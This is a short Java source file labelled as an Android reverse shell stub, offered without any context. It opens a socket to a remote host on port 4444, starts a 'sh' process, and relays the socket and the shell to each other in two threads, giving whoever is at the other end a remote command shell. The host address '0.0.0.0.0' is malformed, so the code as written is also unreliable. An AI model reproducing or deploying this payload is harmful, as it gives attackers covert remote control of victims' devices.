// Android reverse shell stub
import java.net.Socket;
import java.io.*;
public class RevShell {
  public static void main(String[] args) throws Exception {
    Socket s = new Socket("0.0.0.0.0", 4444);
    Process p = Runtime.getRuntime().exec("sh");
    new Thread(new Runnable(){public void run(){try{byte[] b=new byte[1024];int r;while((r=s.getInputStream().read(b))!=-1){p.getOutputStream().write(b,0,r);}}catch(Exception e){}}}).start();
    new Thread(new Runnable(){public void run(){try{byte[] b=new byte[1024];int r;while((r=p.getInputStream().read(b))!=-1){s.getOutputStream().write(b,0,r);}}catch(Exception e){}}}).start();
  }
}
